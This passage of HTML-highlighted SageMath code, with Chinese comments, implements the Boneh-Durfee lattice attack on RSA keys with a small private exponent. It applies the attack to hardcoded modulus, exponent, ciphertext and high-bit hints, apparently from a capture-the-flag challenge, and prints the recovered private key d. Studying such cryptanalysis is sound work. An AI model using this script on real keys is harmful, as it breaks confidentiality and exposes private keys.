+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">monomial</span> <span class="ow">in</span> <span class="n">polynomial</span><span class="o">.</span><span class="n">monomials</span><span class="p">():</span> <span class="c1">#对于多项式中的单项式。单项式（）：</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">monomial</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">monomials</span><span class="p">:</span>  <span class="c1"># 如果单项不在单项中</span>
+</span></span><span class="line"><span class="cl">                <span class="n">monomials</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">monomial</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">monomials</span><span class="o">.</span><span class="n">sort</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1"># y-移位</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">jj</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">tt</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">kk</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">floor</span><span class="p">(</span><span class="n">mm</span><span class="o">/</span><span class="n">tt</span><span class="p">)</span> <span class="o">*</span> <span class="n">jj</span><span class="p">,</span> <span class="n">mm</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">yshift</span> <span class="o">=</span> <span class="n">y</span><span class="o">^</span><span class="n">jj</span> <span class="o">*</span> <span class="n">polZ</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span><span class="o">^</span><span class="n">kk</span> <span class="o">*</span> <span class="n">modulus</span><span class="o">^</span><span class="p">(</span><span class="n">mm</span> <span class="o">-</span> <span class="n">kk</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">yshift</span> <span class="o">=</span> <span class="n">Q</span><span class="p">(</span><span class="n">yshift</span><span class="p">)</span><span class="o">.</span><span class="n">lift</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">gg</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">yshift</span><span class="p">)</span> <span class="c1"># substitution</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1"># 单项式 y 移位列表</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">jj</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">tt</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">kk</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">floor</span><span class="p">(</span><span class="n">mm</span><span class="o">/</span><span class="n">tt</span><span class="p">)</span> <span class="o">*</span> <span class="n">jj</span><span class="p">,</span> <span class="n">mm</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">monomials</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">u</span><span class="o">^</span><span class="n">kk</span> <span class="o">*</span> <span class="n">y</span><span class="o">^</span><span class="n">jj</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1"># 构造格 B</span>
+</span></span><span class="line"><span class="cl">    <span class="n">nn</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">monomials</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">BB</span> <span class="o">=</span> <span class="n">Matrix</span><span class="p">(</span><span class="n">ZZ</span><span class="p">,</span> <span class="n">nn</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ii</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">nn</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BB</span><span class="p">[</span><span class="n">ii</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">gg</span><span class="p">[</span><span class="n">ii</span><span class="p">](</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">jj</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">ii</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">monomials</span><span class="p">[</span><span class="n">jj</span><span class="p">]</span> <span class="ow">in</span> <span class="n">gg</span><span class="p">[</span><span class="n">ii</span><span class="p">]</span><span class="o">.</span><span class="n">monomials</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">                <span class="n">BB</span><span class="p">[</span><span class="n">ii</span><span class="p">,</span> <span class="n">jj</span><span class="p">]</span> <span class="o">=</span> <span class="n">gg</span><span class="p">[</span><span class="n">ii</span><span class="p">]</span><span class="o">.</span><span class="n">monomial_coefficient</span><span class="p">(</span><span class="n">monomials</span><span class="p">[</span><span class="n">jj</span><span class="p">])</span> <span class="o">*</span> <span class="n">monomials</span><span class="p">[</span><span class="n">jj</span><span class="p">](</span><span class="n">UU</span><span class="p">,</span><span class="n">XX</span><span class="p">,</span><span class="n">YY</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1">#约化格的原型</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">helpful_only</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#  #自动删除</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BB</span> <span class="o">=</span> <span class="n">remove_unhelpful</span><span class="p">(</span><span class="n">BB</span><span class="p">,</span> <span class="n">monomials</span><span class="p">,</span> <span class="n">modulus</span><span class="o">^</span><span class="n">mm</span><span class="p">,</span> <span class="n">nn</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 重置维度</span>
+</span></span><span class="line"><span class="cl">        <span class="n">nn</span> <span class="o">=</span> <span class="n">BB</span><span class="o">.</span><span class="n">dimensions</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">nn</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;failure&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">,</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1"># 检查向量是否有帮助</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">helpful_vectors</span><span class="p">(</span><span class="n">BB</span><span class="p">,</span> <span class="n">modulus</span><span class="o">^</span><span class="n">mm</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1"># 检查行列式是否正确界定</span>
+</span></span><span class="line"><span class="cl">    <span class="n">det</span> <span class="o">=</span> <span class="n">BB</span><span class="o">.</span><span class="n">det</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bound</span> <span class="o">=</span> <span class="n">modulus</span><span class="o">^</span><span class="p">(</span><span class="n">mm</span><span class="o">*</span><span class="n">nn</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">det</span> <span class="o">&gt;=</span> <span class="n">bound</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;We do not have det &lt; bound. Solutions might not be found.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;Try with highers m and t.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">diff</span> <span class="o">=</span> <span class="p">(</span><span class="n">log</span><span class="p">(</span><span class="n">det</span><span class="p">)</span> <span class="o">-</span> <span class="n">log</span><span class="p">(</span><span class="n">bound</span><span class="p">))</span> <span class="o">/</span> <span class="n">log</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;size det(L) - size e^(m*n) = &#34;</span><span class="p">,</span> <span class="n">floor</span><span class="p">(</span><span class="n">diff</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">strict</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1"># display the lattice basis</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">matrix_overview</span><span class="p">(</span><span class="n">BB</span><span class="p">,</span> <span class="n">modulus</span><span class="o">^</span><span class="n">mm</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1"># LLL</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;optimizing basis of the lattice via LLL, this can take a long time&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1">#BB = BB.BKZ(block_size=25)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">BB</span> <span class="o">=</span> <span class="n">BB</span><span class="o">.</span><span class="n">LLL</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;LLL is done!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1"># 替换向量 i 和 j -&gt;多项式 1 和 2</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;在格中寻找线性无关向量&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">found_polynomials</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">pol1_idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">nn</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">pol2_idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">pol1_idx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">nn</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            <span class="c1"># 对于i and j, 构造两个多项式</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            <span class="n">PR</span><span class="o">.&lt;</span><span class="n">w</span><span class="p">,</span><span class="n">z</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">PolynomialRing</span><span class="p">(</span><span class="n">ZZ</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pol1</span> <span class="o">=</span> <span class="n">pol2</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">jj</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">nn</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">pol1</span> <span class="o">+=</span> <span class="n">monomials</span><span class="p">[</span><span class="n">jj</span><span class="p">](</span><span class="n">w</span><span class="o">*</span><span class="n">z</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="n">w</span><span class="p">,</span><span class="n">z</span><span class="p">)</span> <span class="o">*</span> <span class="n">BB</span><span class="p">[</span><span class="n">pol1_idx</span><span class="p">,</span> <span class="n">jj</span><span class="p">]</span> <span class="o">/</span> <span class="n">monomials</span><span class="p">[</span><span class="n">jj</span><span class="p">](</span><span class="n">UU</span><span class="p">,</span><span class="n">XX</span><span class="p">,</span><span class="n">YY</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">pol2</span> <span class="o">+=</span> <span class="n">monomials</span><span class="p">[</span><span class="n">jj</span><span class="p">](</span><span class="n">w</span><span class="o">*</span><span class="n">z</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="n">w</span><span class="p">,</span><span class="n">z</span><span class="p">)</span> <span class="o">*</span> <span class="n">BB</span><span class="p">[</span><span class="n">pol2_idx</span><span class="p">,</span> <span class="n">jj</span><span class="p">]</span> <span class="o">/</span> <span class="n">monomials</span><span class="p">[</span><span class="n">jj</span><span class="p">](</span><span class="n">UU</span><span class="p">,</span><span class="n">XX</span><span class="p">,</span><span class="n">YY</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            <span class="c1"># 结果</span>
+</span></span><span class="line"><span class="cl">            <span class="n">PR</span><span class="o">.&lt;</span><span class="n">q</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">PolynomialRing</span><span class="p">(</span><span class="n">ZZ</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">rr</span> <span class="o">=</span> <span class="n">pol1</span><span class="o">.</span><span class="n">resultant</span><span class="p">(</span><span class="n">pol2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">rr</span><span class="o">.</span><span class="n">is_zero</span><span class="p">()</span> <span class="ow">or</span> <span class="n">rr</span><span class="o">.</span><span class="n">monomials</span><span class="p">()</span> <span class="o">==</span> <span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;found them, using vectors&#34;</span><span class="p">,</span> <span class="n">pol1_idx</span><span class="p">,</span> <span class="s2">&#34;and&#34;</span><span class="p">,</span> <span class="n">pol2_idx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">found_polynomials</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">found_polynomials</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">found_polynomials</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;no independant vectors could be found. This should very rarely happen...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="n">rr</span> <span class="o">=</span> <span class="n">rr</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1"># solutions</span>
+</span></span><span class="line"><span class="cl">    <span class="n">soly</span> <span class="o">=</span> <span class="n">rr</span><span class="o">.</span><span class="n">roots</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">soly</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;Your prediction (delta) is too small&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="n">soly</span> <span class="o">=</span> <span class="n">soly</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ss</span> <span class="o">=</span> <span class="n">pol1</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">soly</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">solx</span> <span class="o">=</span> <span class="n">ss</span><span class="o">.</span><span class="n">roots</span><span class="p">()[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">solx</span><span class="p">,</span> <span class="n">soly</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">example</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">#start_time =time.perf_counter</span>
+</span></span><span class="line"><span class="cl">    <span class="n">start</span> <span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">clock</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">size</span><span class="o">=</span><span class="mi">512</span>
+</span></span><span class="line"><span class="cl">    <span class="n">length_N</span> <span class="o">=</span> <span class="mi">2</span><span class="o">*</span><span class="n">size</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ss</span><span class="o">=</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">=</span><span class="mi">70</span>
+</span></span><span class="line"><span class="cl">    <span class="n">M</span><span class="o">=</span><span class="mi">1</span>   <span class="c1"># the number of experiments</span>
+</span></span><span class="line"><span class="cl">    <span class="n">delta</span> <span class="o">=</span> <span class="mi">299</span><span class="o">/</span><span class="mi">1024</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># p =  random_prime(2^512,2^511)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">M</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">N</span> <span class="o">=</span> <span class="mi">123789043095302886784777548580725867919630872720308267296330863659260260632444171595208750648710642616709290340791408935502415290984231140635423328808872594955139658822363033096014857287439409252367248420356169878044065798634016290690979979625051287064109800759113475629317869327100941592970373827299442569489</span>
+</span></span><span class="line"><span class="cl">        <span class="n">e</span> <span class="o">=</span> <span class="mi">112070481298571389221611833986644006256566240788306316765530852688390558290807060037831460397016038678699757261874520899143918664293504728402666398893964929840011110057060969775245481057773655679041350091817099143204028098431544760662690479779286160425059494739419234859710815966582837874194763305328789592245</span>
+</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="mi">63662561509209168743977531923281040338804656992093161358503738280395090747786427812762995865224617853709000826994250614233562094619845247321880231488631212423212167167713869682181551433686816142488666533035193128298379649809096863305651271646535125466745409868274019550361728139482502448613835444108383177119</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hint1</span> <span class="o">=</span> <span class="mi">897446442156802074692</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hint2</span> <span class="o">=</span> <span class="mi">1069442646630079275131</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="mi">7</span>   <span class="c1"># 格大小（越大越好/越慢）</span>
+</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(((</span><span class="mi">1</span><span class="o">-</span><span class="mi">2</span><span class="o">*</span><span class="n">delta</span><span class="p">)</span> <span class="o">*</span> <span class="n">m</span><span class="p">))</span>  <span class="c1"># 来自 Herrmann 和 May 的优化</span>
+</span></span><span class="line"><span class="cl">        <span class="n">X</span> <span class="o">=</span> <span class="n">floor</span><span class="p">(</span><span class="n">N</span><span class="o">^</span><span class="n">delta</span><span class="p">)</span>  <span class="c1"># </span>
+</span></span><span class="line"><span class="cl">        <span class="n">Y</span> <span class="o">=</span> <span class="n">floor</span><span class="p">(</span><span class="n">N</span><span class="o">^</span><span class="p">(</span><span class="mi">1</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="o">^</span><span class="n">s</span><span class="p">)</span>    <span class="c1"># 如果 p、 q 大小相同，则正确</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">hint1</span><span class="p">),</span><span class="nb">int</span><span class="p">(</span><span class="n">hint1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n\n\n</span><span class="s1"> l=&#39;</span><span class="p">,</span><span class="n">l</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pM</span><span class="o">=</span><span class="n">l</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p0</span><span class="o">=</span><span class="n">pM</span><span class="o">*</span><span class="mi">2</span><span class="o">^</span><span class="p">(</span><span class="n">size</span><span class="o">-</span><span class="n">s</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="o">^</span><span class="p">(</span><span class="n">size</span><span class="o">-</span><span class="n">s</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">q0</span><span class="o">=</span><span class="n">N</span><span class="o">/</span><span class="n">p0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">qM</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">q0</span><span class="o">/</span><span class="mi">2</span><span class="o">^</span><span class="p">(</span><span class="n">size</span><span class="o">-</span><span class="n">s</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">A</span> <span class="o">=</span> <span class="n">N</span> <span class="o">+</span> <span class="mi">1</span><span class="o">-</span><span class="n">pM</span><span class="o">*</span><span class="mi">2</span><span class="o">^</span><span class="p">(</span><span class="n">size</span><span class="o">-</span><span class="n">s</span><span class="p">)</span><span class="o">-</span><span class="n">qM</span><span class="o">*</span><span class="mi">2</span><span class="o">^</span><span class="p">(</span><span class="n">size</span><span class="o">-</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#A = N+1</span>
+</span></span><span class="line"><span class="cl">            <span class="n">P</span><span class="o">.&lt;</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">PolynomialRing</span><span class="p">(</span><span class="n">ZZ</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pol</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">x</span> <span class="o">*</span> <span class="p">(</span><span class="n">A</span> <span class="o">+</span> <span class="n">y</span><span class="p">)</span>  <span class="c1">#构建的方程</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            <span class="c1"># Checking bounds</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">#if debug:</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">#print (&#34;=== 核对数据 ===&#34;)</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">#print (&#34;* delta:&#34;, delta)</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">#print (&#34;* delta &lt; 0.292&#34;, delta &lt; 0.292)</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">#print (&#34;* size of e:&#34;, ceil(log(e)/log(2)))  # e的bit数</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># print (&#34;* size of N:&#34;, len(bin(N)))          # N的bit数</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">#print (&#34;* size of N:&#34;, ceil(log(N)/log(2)))  # N的bit数</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">#print (&#34;* m:&#34;, m, &#34;, t:&#34;, t)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            <span class="c1"># boneh_durfee</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">##print (&#34;=== running algorithm ===&#34;)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            <span class="n">solx</span><span class="p">,</span> <span class="n">soly</span> <span class="o">=</span> <span class="n">boneh_durfee</span><span class="p">(</span><span class="n">pol</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">X</span><span class="p">,</span> <span class="n">Y</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">solx</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">#print (&#34;=== solution found ===&#34;)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="kc">False</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;x:&#34;</span><span class="p">,</span> <span class="n">solx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;y:&#34;</span><span class="p">,</span> <span class="n">soly</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">                <span class="n">d_sol</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pol</span><span class="p">(</span><span class="n">solx</span><span class="p">,</span> <span class="n">soly</span><span class="p">)</span> <span class="o">/</span> <span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ss</span><span class="o">=</span><span class="n">ss</span><span class="o">+</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;=== solution found ===&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;p的高比特为：&#34;</span><span class="p">,</span><span class="n">l</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;q的高比特为：&#34;</span><span class="p">,</span><span class="n">qM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;d=&#34;</span><span class="p">,</span><span class="n">d_sol</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=== </span><span class="si">%s</span><span class="s2"> seconds ===&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">#break</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ss=&#34;</span><span class="p">,</span><span class="n">ss</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                            <span class="c1">#end=time.process_time</span>
+</span></span><span class="line"><span class="cl">        <span class="n">end</span><span class="o">=</span><span class="n">time</span><span class="o">.</span><span class="n">clock</span><span class="p">()</span>
